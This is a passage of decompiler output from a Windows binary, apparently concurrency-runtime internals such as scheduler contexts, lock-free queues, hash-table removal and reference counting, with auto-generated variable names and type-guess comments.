  *(_QWORD *)(a1 + 216) = v5;
  sub_13F15EF70(v5, 0, 8i64 * *(int *)(a1 + 208));
  *(_QWORD *)(a1 + 224) = 0i64;
  *(_QWORD *)(a1 + 232) = sub_13F1790C4(32i64, v6);
  *(_DWORD *)(a1 + 32) = sub_13F149E78(*(_QWORD *)(a1 + 56));
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  return a1;
}
// 13F14DD0F: variable 'v4' is possibly undefined
// 13F14DD3B: variable 'v6' is possibly undefined
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18ABC8: using guessed type __int64 (__fastcall *off_13F18ABC8[18])();

//----- (000000013F14DDA4) ----------------------------------------------------
__int64 __fastcall sub_13F14DDA4(__int64 a1)
{
  __int64 v2; // rdx

  sub_13F14F2EC((int *)a1);
  return sub_13F14088C(*(_QWORD *)(a1 + 8), v2);
}
// 13F14DDBB: variable 'v2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14DDC0) ----------------------------------------------------
__int64 __fastcall sub_13F14DDC0(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx

  sub_13F14088C(*(_QWORD *)(a1 + 16), a2);
  return sub_13F14088C(*(_QWORD *)(a1 + 24), v3);
}
// 13F14DDDB: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14DDE0) ----------------------------------------------------
__int64 __fastcall sub_13F14DDE0(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx

  sub_13F14088C(*(_QWORD *)(a1 + 32), a2);
  return sub_13F14088C(*(_QWORD *)(a1 + 40), v3);
}
// 13F14DDFB: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14DE00) ----------------------------------------------------
__int64 __fastcall sub_13F14DE00(__int64 a1, __int64 a2)
{
  _QWORD *v3; // rsi
  _QWORD *v4; // rbx

  if ( *(int *)(a1 + 4) > 0 )
  {
    v3 = **(_QWORD ***)(a1 + 8);
    if ( v3 )
    {
      do
      {
        v4 = (_QWORD *)v3[1];
        sub_13F14088C(*v3, a2);
        sub_13F14088C(v3, 16i64);
        v3 = v4;
      }
      while ( v4 );
    }
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 8), a2);
}
// 13F14DE2B: variable 'a2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14DE6C) ----------------------------------------------------
void **__fastcall sub_13F14DE6C(__int64 a1, __int64 a2)
{
  _QWORD *v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdx
  void **result; // rax

  if ( *(int *)(a1 + 228) > 0 )
  {
    v3 = **(_QWORD ***)(a1 + 232);
    if ( v3 )
    {
      do
      {
        v4 = (_QWORD *)v3[1];
        sub_13F14088C(*v3, a2);
        sub_13F14088C(v3, 16i64);
        v3 = v4;
      }
      while ( v4 );
    }
  }
  sub_13F14088C(*(_QWORD *)(a1 + 232), a2);
  sub_13F14F2EC((int *)(a1 + 208));
  sub_13F14088C(*(_QWORD *)(a1 + 216), v5);
  result = &Concurrency::Context::`vftable';
  *(_QWORD *)a1 = &Concurrency::Context::`vftable';
  return result;
}
// 13F14DE9D: variable 'a2' is possibly undefined
// 13F14DED6: variable 'v5' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18AB90: using guessed type void *Concurrency::Context::`vftable';

//----- (000000013F14DEF8) ----------------------------------------------------
void __fastcall sub_13F14DEF8(__int64 a1)
{
  sub_13F141BE4((volatile signed __int32 *)(*(_QWORD *)a1 + 8i64));
}

//----- (000000013F14DF18) ----------------------------------------------------
_QWORD *__fastcall sub_13F14DF18(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::Context::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18AB90: using guessed type void *Concurrency::Context::`vftable';

//----- (000000013F14DF44) ----------------------------------------------------
__int64 __fastcall sub_13F14DF44(__int64 a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  sub_13F14DE6C(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 240i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14DF78) ----------------------------------------------------
__int64 __fastcall sub_13F14DF78(__int64 a1, signed __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v3; // esi
  char v4; // bp
  _QWORD *v7; // r9
  signed __int32 v8; // edx
  _QWORD *v9; // r8
  int v10; // er10
  int v11; // er11
  unsigned __int64 v12; // rcx
  unsigned __int128 v13; // rax
  __int64 v14; // r14
  __int64 v15; // rax
  __int64 v16; // rdx
  char v18[8]; // [rsp+20h] [rbp-48h] BYREF
  int v19; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v20)(); // [rsp+30h] [rbp-38h]

  v2 = *(_QWORD *)(a1 + 88);
  v3 = 0;
  v4 = 0;
  do
  {
    if ( *(int *)(v2 + 16) >= -1 )
    {
      v7 = *(_QWORD **)v2;
      v8 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v9 = *(_QWORD **)v2;
        while ( 1 )
        {
          if ( !*v9 )
          {
            v10 = v8 + v3;
            *(_DWORD *)(a2 + 164) = v8 + v3;
            v11 = *(_DWORD *)(a1 + 112);
            if ( !_InterlockedCompareExchange64(&v7[v8], a2, 0i64) )
              break;
          }
          ++v8;
          ++v9;
          if ( v8 >= *(_DWORD *)(a1 + 80) )
            goto LABEL_12;
        }
        v4 = 1;
        v3 += v8;
        if ( v10 >= v11 )
          _InterlockedAdd((volatile signed __int32 *)(a1 + 112), 1u);
        _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -1, v8);
      }
    }
LABEL_12:
    if ( !v4 )
    {
      _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -2, -1);
      v3 += *(_DWORD *)(a1 + 80);
      if ( !*(_QWORD *)(v2 + 8) && !_InterlockedCompareExchange64((volatile signed __int64 *)(v2 + 8), 1i64, 0i64) )
      {
        v12 = *(int *)(a1 + 80);
        v13 = v12 * (unsigned __int128)8ui64;
        if ( !is_mul_ok(v12, 8ui64) )
          *(_QWORD *)&v13 = -1i64;
        v14 = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
        sub_13F15EF70(v14, 0, 8i64 * *(int *)(a1 + 80));
        v15 = sub_13F14059C(24i64);
        v16 = v15;
        if ( v15 )
        {
          *(_QWORD *)(v15 + 8) = 0i64;
          *(_QWORD *)v15 = v14;
          *(_DWORD *)(v15 + 16) = -1;
        }
        else
        {
          v16 = 0i64;
        }
        if ( *(_DWORD *)(a1 + 108) < *(_DWORD *)(a1 + 104) )
          *(_QWORD *)(*(_QWORD *)(a1 + 96) + 8i64 * (int)(*(_DWORD *)(a1 + 108))++) = v16;
        _InterlockedExchange64((volatile __int64 *)(v2 + 8), v16);
      }
      if ( *(_QWORD *)(v2 + 8) == 1i64 )
      {
        v19 = 0;
        v20 = sub_13F142C6C;
        do
          sub_13F141BF4((__int64)v18);
        while ( *(_QWORD *)(v2 + 8) == 1i64 );
      }
    }
    v2 = *(_QWORD *)(v2 + 8);
  }
  while ( !v4 );
  return v3;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F14DF78: using guessed type char var_48[8];

//----- (000000013F14E0F8) ----------------------------------------------------
void __fastcall sub_13F14E0F8(__int64 a1, __int64 a2, char a3)
{
  sub_13F14E148((volatile signed __int32 *)(a1 + 144), (_QWORD *)(a2 + 160));
  *(_BYTE *)(a2 + 137) = 1;
  if ( a3 )
    _InterlockedDecrement((volatile signed __int32 *)(a1 + 176));
}

//----- (000000013F14E148) ----------------------------------------------------
void __fastcall sub_13F14E148(volatile signed __int32 *a1, _QWORD *a2)
{
  sub_13F141A20(a1 + 2);
  if ( *(_QWORD *)a1 )
  {
    a2[1] = *(_QWORD *)(*(_QWORD *)a1 + 8i64);
    *a2 = *(_QWORD *)a1;
    **(_QWORD **)(*(_QWORD *)a1 + 8i64) = a2;
    *(_QWORD *)(*(_QWORD *)a1 + 8i64) = a2;
  }
  else
  {
    a2[1] = a2;
    *a2 = a2;
  }
  *(_QWORD *)a1 = a2;
  sub_13F141BE8((__int64)(a1 + 2));
}

//----- (000000013F14E1C0) ----------------------------------------------------
__int64 __fastcall sub_13F14E1C0(__int64 a1, signed __int32 a2)
{
  signed __int32 v2; // edi
  signed __int32 v4; // eax
  signed __int32 v5; // ett
  __int64 result; // rax
  int v7; // ett

  v2 = a2;
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 188));
  v4 = *(_DWORD *)(a1 + 180);
  while ( v4 == -1 || a2 <= v4 )
  {
    v5 = v4;
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 180), a2, v4);
    if ( v5 == v4 )
    {
      if ( *(_DWORD *)(a1 + 192) )
        a2 = -1;
      sub_13F14E910(a1, a2);
      break;
    }
  }
  result = *(unsigned int *)(a1 + 184);
  do
  {
    if ( (_DWORD)result != -1 && v2 < (int)result )
      break;
    v7 = result;
    result = (unsigned int)_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 184), v2, result);
  }
  while ( v7 != (_DWORD)result );
  return result;
}

//----- (000000013F14E230) ----------------------------------------------------
bool __fastcall sub_13F14E230(__int64 a1, signed __int32 a2)
{
  _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 180), -1, a2);
  sub_13F14EBF0(a1);
  return _InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 188), 0xFFFFFFFF) == 1;
}

//----- (000000013F14E26C) ----------------------------------------------------
void __fastcall sub_13F14E26C(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  __int64 v5; // rbx
  bool i; // zf
  __int64 v7; // rdi
  __int64 v8; // rdx
  int v9; // er8
  int v10; // eax

  v4 = a1 + 144;
  sub_13F1419E0(a1 + 152);
  v5 = *(_QWORD *)v4;
  for ( i = *(_QWORD *)v4 == 0i64; ; i = v5 == *(_QWORD *)v4 )
  {
    v5 = i ? 0i64 : *(_QWORD *)(v5 + 8);
    if ( !v5 )
      break;
    v7 = v5 - 160;
    if ( *(_DWORD *)(v5 - 160 + 192) )
      continue;
    v8 = *(_QWORD *)(v7 + 88);
    if ( v8 == a2 )
    {
LABEL_11:
      _InterlockedExchange((volatile __int32 *)(v7 + 192), 1);
      sub_13F14E1C0(v5 - 160, -999);
      sub_13F14E26C(v5 - 160, 0i64);
      continue;
    }
    if ( a2 )
    {
      v10 = (16 * *(_DWORD *)(a2 + 8)) >> 4;
      if ( v10 == -1 )
        continue;
      v9 = (16 * *(_DWORD *)(v8 + 8)) >> 4;
      if ( v9 <= v10 )
        continue;
    }
    else
    {
      v9 = (16 * *(_DWORD *)(v8 + 8)) >> 4;
      if ( v9 == -1 )
        continue;
    }
    if ( *(_DWORD *)(a1 + 112) == -1 || sub_13F14E9DC(a1, v8, v9) )
      goto LABEL_11;
  }
  sub_13F141BE4((volatile signed __int32 *)(v4 + 8));
}

//----- (000000013F14E374) ----------------------------------------------------
char __fastcall sub_13F14E374(__int64 a1)
{
  char result; // al
  __int64 v3; // rdx
  _QWORD *v4; // rdi
  _QWORD *v5; // rbp
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 v8; // rdx

  result = sub_13F14A2E4(*(_QWORD *)(a1 + 72));
  if ( !result )
  {
    v4 = *(_QWORD **)(a1 + 32);
    while ( v4 )
    {
      v5 = v4 - 6;
      v4 = (_QWORD *)*v4;
      if ( v5 )
      {
        sub_13F14088C(v5[26], v3);
        sub_13F14088C(v5[27], v6);
        sub_13F14088C(v5[2], v7);
        sub_13F14088C(v5[3], v8);
        result = sub_13F14088C(v5, 240i64);
      }
    }
    *(_QWORD *)(a1 + 32) = 0i64;
    _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
  }
  return result;
}
// 13F14E3B3: variable 'v3' is possibly undefined
// 13F14E3BF: variable 'v6' is possibly undefined
// 13F14E3C8: variable 'v7' is possibly undefined
// 13F14E3D1: variable 'v8' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14E40C) ----------------------------------------------------
char __fastcall sub_13F14E40C(unsigned int *a1, _QWORD *a2)
{
  __int64 v2; // rbx
  __int64 v4; // r8

  v2 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)a1 + 24i64) + 8i64 * a1[2]);
  if ( v2 == 1
    || _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(*(_QWORD *)a1 + 24i64) + 8i64 * a1[2]), 1i64) != v2 )
  {
    v4 = *(_QWORD *)a1;
    if ( !_InterlockedDecrement((volatile signed __int32 *)(*(_QWORD *)a1 + 36i64)) )
      sub_13F14AA74(
        (__int64 (__fastcall **)(__int64))(v4 + 48),
        (__int64 (__fastcall *)(__int64))sub_13F14EF30,
        (__int64 (__fastcall *)(__int64))v4,
        *(_QWORD *)v4);
    return 0;
  }
  else
  {
    if ( a2 )
      *a2 = v2;
    return 1;
  }
}

//----- (000000013F14E47C) ----------------------------------------------------
__int64 __fastcall sub_13F14E47C(__int64 a1, __int64 a2)
{
  sub_13F14EC9C(a1, a2);
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F14E4D8) ----------------------------------------------------
__int64 __fastcall sub_13F14E4D8(__int64 a1, __int64 a2)
{
  int *v2; // r14
  int v3; // edi
  int v4; // eax
  _QWORD *v5; // rcx
  _QWORD *v6; // rbx
  __int64 v7; // rsi
  int v8; // eax
  __int64 v9; // rbx
  _QWORD *v10; // rcx

  v2 = (int *)(a1 + 208);
  v3 = 0;
  v4 = 0;
  if ( *(int *)(a1 + 208) <= 0 )
  {
LABEL_5:
    v6 = 0i64;
  }
  else
  {
    a2 = 0i64;
    v5 = *(_QWORD **)(a1 + 216);
    while ( !*v5 )
    {
      ++v4;
      ++a2;
      ++v5;
      if ( a2 >= *v2 )
        goto LABEL_5;
    }
    v3 = v4;
    v6 = *(_QWORD **)(*((_QWORD *)v2 + 1) + 8i64 * v4);
  }
  if ( v6 )
  {
    v7 = v3;
    do
    {
      do
      {
        sub_13F1507A0(v6[2], a2);
        v6 = (_QWORD *)*v6;
      }
      while ( v6 );
      ++v3;
      ++v7;
      v8 = v3;
      v9 = v7;
      if ( v3 >= *v2 )
      {
LABEL_13:
        v6 = 0i64;
      }
      else
      {
        a2 = *((_QWORD *)v2 + 1);
        v10 = (_QWORD *)(a2 + 8 * v7);
        while ( !*v10 )
        {
          ++v8;
          ++v9;
          ++v10;
          if ( v9 >= *v2 )
            goto LABEL_13;
        }
        v7 = v9;
        v3 = v8;
        v6 = *(_QWORD **)(a2 + 8 * v9);
      }
    }
    while ( v6 );
  }
  return sub_13F14F2EC(v2);
}
// 13F14E52A: variable 'a2' is possibly undefined

//----- (000000013F14E5A0) ----------------------------------------------------
__int64 sub_13F14E5A0()
{
  return sub_13F142820();
}
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14E5B0) ----------------------------------------------------
__int64 __fastcall sub_13F14E5B0(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rcx
  __int64 v6; // rax
  __int64 result; // rax

  v2 = sub_13F158D8C(*(_QWORD *)(a1 + 48));
  *(_QWORD *)(a1 + 64) = v2;
  v3 = 0i64;
  if ( !v2 )
  {
    v4 = MEMORY[0x771DAED0](*(_QWORD *)(a1 + 48) + 160i64);
    v5 = 0i64;
    if ( v4 )
      v5 = v4 - 48;
    *(_QWORD *)(a1 + 64) = v5;
    if ( v5 )
    {
      sub_13F15AB98(v5);
      v3 = *(_QWORD *)(a1 + 64);
    }
    else
    {
      v6 = sub_13F14059C(240i64);
      if ( v6 )
        v3 = sub_13F15AAF8(v6);
      *(_QWORD *)(a1 + 64) = v3;
    }
    sub_13F14DF78(*(_QWORD *)(a1 + 48) + 160i64, v3);
  }
  result = *(_QWORD *)(a1 + 64);
  *(_QWORD *)(result + 168) = a1;
  return result;
}

//----- (000000013F14E658) ----------------------------------------------------
void __fastcall sub_13F14E658(__int64 a1, __int64 a2)
{
  bool v3; // di
  char v4; // r14
  __int64 *v5; // rdi
  bool v6; // zf
  __int64 *v7; // r12
  __int64 *v8; // r15
  volatile signed __int32 *v9; // rsi
  __int64 *v10; // rax
  __int64 v11; // rax
  _DWORD v12[4]; // [rsp+38h] [rbp-40h] BYREF
  __int64 (__fastcall *v13)(); // [rsp+48h] [rbp-30h]

  if ( *(_DWORD *)(a1 + 176) )
  {
    v12[2] = 0;
    v13 = sub_13F142C6C;
    do
      sub_13F141CA8(v12);
    while ( *(_DWORD *)(a1 + 176) );
  }
  if ( *(int *)(a1 + 212) > 0 )
    sub_13F14E4D8(a1, a2);
  if ( *(_QWORD *)(a1 + 144) )
  {
    v3 = 0;
    while ( !v3 )
    {
      sub_13F141A20((volatile signed __int32 *)(a1 + 152));
      v4 = 1;
      v5 = *(__int64 **)(a1 + 144);
      if ( v5 )
        v5 = (__int64 *)v5[1];
      while ( 1 )
      {
        v6 = v5 == 0i64;
        if ( !v5 )
          break;
        if ( v5 == *(__int64 **)(a1 + 144) )
          v7 = 0i64;
        else
          v7 = (__int64 *)v5[1];
        v8 = v5 - 20;
        v9 = (volatile signed __int32 *)sub_13F150480(*(v5 - 9));
        if ( !sub_13F141DD0(v9 + 2) )
        {
          sub_13F141BE8(a1 + 152);
          v4 = 0;
          sub_13F1427BC(1i64);
          v6 = v5 == 0i64;
          break;
        }
        *(_QWORD *)v5[1] = *v5;
        *(_QWORD *)(*v5 + 8) = v8[21];
        v10 = *(__int64 **)(a1 + 144);
        if ( v5 == v10 )
        {
          if ( v10 == (__int64 *)v10[1] )
            v11 = 0i64;
          else
            v11 = *v10;
          *(_QWORD *)(a1 + 144) = v11;
        }
        *((_BYTE *)v8 + 137) = 0;
        if ( *(_QWORD *)v9 )
        {
          v8[21] = *(_QWORD *)(*(_QWORD *)v9 + 8i64);
          *v5 = *(_QWORD *)v9;
          **(_QWORD **)(*(_QWORD *)v9 + 8i64) = v5;
          *(_QWORD *)(*(_QWORD *)v9 + 8i64) = v5;
        }
        else
        {
          v5[1] = (__int64)v5;
          *v5 = (__int64)v5;
        }
        *(_QWORD *)v9 = v5;
        sub_13F141BE8((__int64)(v9 + 2));
        v5 = v7;
      }
      v3 = v6;
      if ( v4 )
        sub_13F141BE8(a1 + 152);
    }
  }
  else
  {
    sub_13F141B70(a1 + 152);
  }
}
// 13F14E6B1: variable 'a2' is possibly undefined
// 13F1427BC: using guessed type __int64 __fastcall sub_13F1427BC(_QWORD);
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();

//----- (000000013F14E82C) ----------------------------------------------------
__int64 __fastcall sub_13F14E82C(__int64 a1)
{
  __int64 result; // rax

  result = (unsigned int)(*(_DWORD *)(a1 + 36) + 1);
  *(_DWORD *)(a1 + 36) = result;
  return result;
}

//----- (000000013F14E838) ----------------------------------------------------
__int64 __fastcall sub_13F14E838(__int64 a1)
{
  int v1; // eax
  __int64 result; // rax

  v1 = *(_DWORD *)(a1 + 40);
  ++*(_DWORD *)(a1 + 36);
  result = (unsigned int)(v1 + 1);
  *(_DWORD *)(a1 + 40) = result;
  return result;
}

//----- (000000013F14E844) ----------------------------------------------------
__int64 __fastcall sub_13F14E844(__int64 a1)
{
  __int64 result; // rax

  result = (unsigned int)(*(_DWORD *)(a1 + 36) - 1);
  *(_DWORD *)(a1 + 36) = result;
  return result;
}

//----- (000000013F14E850) ----------------------------------------------------
__int64 __fastcall sub_13F14E850(__int64 a1)
{
  int v1; // eax
  __int64 result; // rax

  v1 = *(_DWORD *)(a1 + 40);
  --*(_DWORD *)(a1 + 36);
  result = (unsigned int)(v1 - 1);
  *(_DWORD *)(a1 + 40) = result;
  return result;
}

//----- (000000013F14E85C) ----------------------------------------------------
char __fastcall sub_13F14E85C(int *a1, _QWORD *a2, _QWORD *a3)
{
  unsigned __int64 v5; // r9
  unsigned __int64 i; // r10
  __int64 v7; // rax
  __int64 v8; // rdi
  __int64 v9; // r10
  _QWORD *v10; // rdx
  _QWORD *v11; // rcx
  __int64 v12; // rax

  v5 = 0xCBF29CE484222325ui64;
  for ( i = 0i64; i < 8; ++i )
  {
    v7 = *((unsigned __int8 *)a2 + i);
    v5 = 0x100000001B3i64 * (v7 ^ v5);
  }
  v8 = *((_QWORD *)a1 + 1);
  v9 = (int)(v5 % *a1);
  v10 = 0i64;
  v11 = *(_QWORD **)(v8 + 8 * v9);
  if ( v11 )
  {
    while ( 1 )
    {
      v12 = *v11;
      if ( v11[1] == *a2 )
        break;
      v10 = v11;
      v11 = (_QWORD *)*v11;
      if ( !v12 )
        goto LABEL_6;
    }
    if ( v10 )
      *v10 = v12;
    else
      *(_QWORD *)(v8 + 8 * v9) = v12;
    --a1[1];
  }
  else
  {
LABEL_6:
    v11 = 0i64;
  }
  if ( !v11 )
    return 0;
  if ( a3 )
    *a3 = v11[2];
  sub_13F14088C(v11, 24i64);
  return 1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14E910) ----------------------------------------------------
void __fastcall sub_13F14E910(__int64 a1, int a2)
{
  int v2; // er11
  int v3; // er8
  char v5; // r9
  __int64 v6; // rcx
  int v7; // eax
  _QWORD *v8; // rcx
  int i; // eax
  __int64 v10; // rax

  v2 = *(_DWORD *)(a1 + 224);
  v3 = 0;
  if ( v2 > 0 )
  {
    v5 = 0;
    do
    {
      v6 = *(_QWORD *)(a1 + 232);
      v7 = v3 >> 4;
      if ( v3 >> 4 >= 4 )
      {
        v8 = *(_QWORD **)(v6 + 24);
        for ( i = v7 - 3; i; --i )
          v8 = (_QWORD *)v8[1];
      }
      else
      {
        v8 = *(_QWORD **)(v6 + 8i64 * v7);
      }
      v10 = v5 & 0xF;
      if ( *(_DWORD *)(*v8 + 8 * v10 + 4) >= a2 && (*(_DWORD *)(a1 + 112) == -1 || *(_DWORD *)(a1 + 112) <= a2) )
        _InterlockedIncrement((volatile signed __int32 *)(*v8 + 8 * v10));
      ++v3;
      ++v5;
    }
    while ( v3 < v2 );
  }
}

//----- (000000013F14E98C) ----------------------------------------------------
char __fastcall sub_13F14E98C(__int64 a1)
{
  if ( *(_DWORD *)(a1 + 40) )
    return 2;
  else
    return *(_DWORD *)(a1 + 36) != 0;
}

//----- (000000013F14E9A0) ----------------------------------------------------
__int64 __fastcall sub_13F14E9A0(__int64 a1)
{
  return *(unsigned int *)(a1 + 32);
}

//----- (000000013F14E9A4) ----------------------------------------------------
__int64 __fastcall sub_13F14E9A4(__int64 a1)
{
  __int64 v1; // rdx
  __int64 result; // rax

  v1 = *(_QWORD *)(a1 + 48);
  result = 0i64;
  if ( v1 )
    return *(_QWORD *)(v1 + 424);
  return result;
}

//----- (000000013F14E9B8) ----------------------------------------------------
__int64 __fastcall sub_13F14E9B8(__int64 a1)
{
  __int64 v1; // rcx

  v1 = *(_QWORD *)(a1 + 48);
  if ( v1 )
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(v1 + 424) + 8i64))(*(_QWORD *)(v1 + 424));
  else
    return 0xFFFFFFFFi64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14E9DC) ----------------------------------------------------
bool __fastcall sub_13F14E9DC(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  int v8; // eax
  char v9; // al

  v3 = a2;
  if ( *(int *)(a1 + 188) <= 0 || *(_DWORD *)(a1 + 180) > a3 )
    return 0;
  if ( *(_DWORD *)(a1 + 112) != -1 && *(_DWORD *)(a1 + 180) < *(_DWORD *)(a1 + 112) )
  {
    v5 = *(_QWORD *)(a1 + 96);
    if ( a2 == v5 && a3 == (16 * *(_DWORD *)(v5 + 8)) >> 4 )
    {
      v6 = *(_QWORD *)(a1 + 104);
LABEL_8:
      if ( v6 != 2 )
        return *(_DWORD *)(v6 + 16) != 0;
    }
    else
    {
      do
      {
        if ( v3 == *(_QWORD *)(a1 + 88) )
          break;
        v8 = (16 * *(_DWORD *)(v3 + 8)) >> 4;
        if ( v8 == a3 )
          break;
        v3 = v8 == -1 ? 0i64 : *(_QWORD *)v3;
      }
      while ( v3 );
      while ( v3 )
      {
        if ( v3 == *(_QWORD *)(a1 + 88) || sub_13F15A8EC(v3, 0i64) )
        {
          if ( v3 == *(_QWORD *)(a1 + 88) )
            return 0;
          v6 = sub_13F15A8EC(v3, 0i64);
          goto LABEL_8;
        }
        v9 = (*(int *)(v3 + 8) >> 28) & 1;
        if ( v9 && (*(_BYTE *)(v3 + 40) & 3) != 0 || !v9 && sub_13F1505D0(v3) )
          return 1;
        if ( (*(_DWORD *)(v3 + 8) & 0xFFFFFFF) == 0xFFFFFFF )
          v3 = 0i64;
        else
          v3 = *(_QWORD *)v3;
      }
    }
    return 0;
  }
  return 1;
}
// 13F14EAD8: conditional instruction was optimized away because rbx.8!=0

//----- (000000013F14EAF4) ----------------------------------------------------
__int64 __fastcall sub_13F14EAF4(__int64 a1)
{
  __int32 v1; // edx
  unsigned __int64 v2; // r8
  __int64 v3; // r9
  unsigned int *v4; // r8
  __int64 v5; // r10
  __int64 v6; // r8

  do
  {
    v1 = *(_DWORD *)(a1 + 4) - 1;
    _InterlockedExchange((volatile __int32 *)(a1 + 4), v1);
    if ( *(_DWORD *)a1 > v1 )
    {
      *(_DWORD *)(a1 + 4) = v1 + 1;
      return sub_13F14F088(a1);
    }
    v2 = v1 & (unsigned __int64)*(int *)(a1 + 8);
    v3 = *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * v2);
  }
  while ( !v3 );
  if ( (v3 & 1) == 0 )
    return v3;
  v3 &= ~1ui64;
  v4 = (unsigned int *)(*(_QWORD *)(a1 + 40) + 16 * v2);
  v5 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)v4 + 24i64) + 8i64 * v4[2]);
  if ( v5 != 1
    && _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(*(_QWORD *)v4 + 24i64) + 8i64 * v4[2]), 1i64) == v5 )
  {
    return v3;
  }
  v6 = *(_QWORD *)v4;
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)(v6 + 36), 0xFFFFFFFF) == 1 )
    sub_13F14AA74(
      (__int64 (__fastcall **)(__int64))(v6 + 48),
      (__int64 (__fastcall *)(__int64))sub_13F14EF30,
      (__int64 (__fastcall *)(__int64))v6,
      *(_QWORD *)v6);
  return 1i64;
}

//----- (000000013F14EBA8) ----------------------------------------------------
__int64 __fastcall sub_13F14EBA8(__int64 a1)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 72);
  sub_13F142820();
  *(_QWORD *)(a1 + 72) = 0i64;
  return v1;
}
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14EBDC) ----------------------------------------------------
__int64 __fastcall sub_13F14EBDC(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 72) = a2;
  return sub_13F142820();
}
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14EBF0) ----------------------------------------------------
__int64 __fastcall sub_13F14EBF0(__int64 a1)
{
  __int64 v2; // rbx
  int v3; // edi
  bool v4; // zf
  __int64 result; // rax
  int v6; // ett

  _InterlockedExchange((volatile __int32 *)(a1 + 184), -1);
  v2 = *(_QWORD *)(a1 + 96);
  v3 = *(_DWORD *)(a1 + 192) != 0 ? -999 : -1;
  while ( v2 && v2 != *(_QWORD *)(a1 + 88) )
  {
    if ( ((*(int *)(v2 + 8) >> 28) & 1) != 0 )
      v4 = (*(_BYTE *)(v2 + 40) & 3) == 0;
    else
      v4 = !sub_13F1505D0(v2);
    if ( !v4 )
    {
      v3 = (16 * *(_DWORD *)(v2 + 8)) >> 4;
      break;
    }
    if ( (*(_DWORD *)(v2 + 8) & 0xFFFFFFF) == 0xFFFFFFF )
      v2 = 0i64;
    else
      v2 = *(_QWORD *)v2;
  }
  result = 0xFFFFFFFFi64;
  do
  {
    if ( (_DWORD)result != -1 && v3 < (int)result )
      break;
    v6 = result;
    result = (unsigned int)_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 184), v3, result);
  }
  while ( v6 != (_DWORD)result );
  return result;
}

//----- (000000013F14EC94) ----------------------------------------------------
void __fastcall sub_13F14EC94(__int64 a1)
{
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 176));
}

//----- (000000013F14EC9C) ----------------------------------------------------
void __fastcall sub_13F14EC9C(__int64 a1, __int64 a2)
{
  signed __int64 v2; // rdi

  v2 = *(_QWORD *)(a1 + 64);
  if ( v2 )
  {
    *(_QWORD *)(a1 + 64) = 0i64;
